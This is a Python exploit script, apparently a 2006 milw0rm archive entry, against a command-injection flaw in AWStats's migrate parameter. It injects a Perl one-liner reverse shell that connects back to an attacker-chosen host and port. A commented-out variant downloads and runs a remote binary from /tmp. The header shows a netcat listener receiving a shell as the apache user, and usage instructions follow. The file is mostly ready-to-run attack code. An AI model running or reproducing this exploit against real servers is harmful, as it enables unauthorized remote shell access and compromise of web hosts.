#!/usr/bin/env python
# http://secunia.com/advisories/19969/
# by redsand@blacksecurity.org
# May 5, 2006 - HAPPY CINCO DE MAYO
# HAPPY BIRTHDAY DAD
# private plz


#
# 	redsand@jinxy ~/ $ nc -l -p 31337 -v
#	listening on [any] 31337 ...
#	connect to [65.99.197.147] from blacksecurity.org [65.99.197.147] 53377
#	id
#	uid=81(apache) gid=81(apache) groups=81(apache)
#


import sys, socket, base64
import urllib2, urlparse, urllib

# perl 1 line tcp connect-back code
# needs ip & port
cmd = 'perl -e \'$h="%s";$p=%r;use Socket;$sp=inet_aton($h);$sa=sockaddr_in($p,$sp);;socket(CLIENT,PF_INET,SOCK_STREAM,getprotobyname("tcp"));gethostbyname($h);connect(CLIENT,$sa);open(STDIN,">&CLIENT");open(STDOUT,">&CLIENT");open(STDERR,">&CLIENT");if(fork()){exec "/bin/sh"; exit(0); };\'';

class	rbawstatsMigrate:
	__url = ''
	__user = ''
	__password = ''
	__auth = False
	__chost =False
	__cport = False

	def	__init__(self,host=False, ur=False, ps=False, chost=False, cport=False):
		if host:
			self.__url = host
		if ur:
			self.__user = ur
		if ps:
			self.__password = ps

		if ur or ps:	self.__auth = True


		if chost: self.__chost = chost
		if cport: self.__cport = cport


		url = urlparse.urlsplit(self.__url)

		i = url[1].find(';')
		if i >= 0:
			self.__parsed_host = url[1][:i]
		else:
			self.__parsed_host = url[1]

	def	probe(self):

		cphost = socket.gethostbyname_ex(self.__chost)

		my_cmd = cmd % (cphost[2][0],self.__cport)
		url_xpl = { "config": self.__parsed_host,
			    "migrate":"|cd /tmp/ && %s|awstats052005.%s.txt" % (my_cmd, self.__parsed_host)
			    # "migrate":"|cd /tmp/ && wget %s && chmod 777 %s && /tmp/%s|awstats052005.%s.txt" % (rsv, fname, fname, self.__parsed_host)

			  }

		#if self.__url[len(self.__url) -1] != '?':
		#	url_xpl = '?' + url_xpl

		url = self.__url
		url_xpl =  urllib.urlencode(url_xpl)

		try:
			req = urllib2.Request(url, url_xpl)
			if(self.__auth):
				b64str = base64.encodestring('%s:%s' % (self.__user,self.__password))[:-1]
				req.add_header('Authorization', "Basic %s"% b64str)

			req.add_header('Referer', "http://exploit.by.redsand.of.blacksecurity.org")
			req.add_header('Accept', 'text/xml,application/xml,application/xhtml+xml,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1')
			req.add_header('Accept-Language','en-us')
			req.add_header('Accept-Encoding','deflate, gzip')
			req.add_header('User-Agent', "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; [BL4CK] Security")
			req.add_header('Connection' ,'Keep-Alive')
			req.add_header('Cache-Control','no-cache')
			q = urllib2.urlopen(req)
		except IOError, e:
			print "FAILED %s" % e
			sys.exit(0)

		print "SUCCESS, now check to see if it connected-back properly to %s:%s" % (self.__chost,self.__cport)
		sys.exit(0)




user=False
pas=False
url=False
chst=False
cprt=False

print "[BL4CK] AWStats CMD Injection Exploit by redsand@blacksecurity.org"
print "http://secunia.com/advisories/19969/"
print "http://blacksecurity.org - f0r my h0mi3s"

argc = len(sys.argv)
if(argc <= 3):
	print "USAGE: %s http://host/awstats.pl <connect back host> <connect back port> [username] [password] " % sys.argv[0]
	print "\t\* Support 401 HTTP Authentication"
	sys.exit(0)
if(argc > 1):
	url = sys.argv[1]
if(argc > 2):
	chst = sys.argv[2]
if(argc > 3):
	cprt = sys.argv[3]
if(argc > 4):
	user = sys.argv[4]
if(argc > 5):
	pas = sys.argv[5]





red = rbawstatsMigrate(url, user, pas, chst, cprt)

red.probe()

# milw0rm.com [2006-05-06]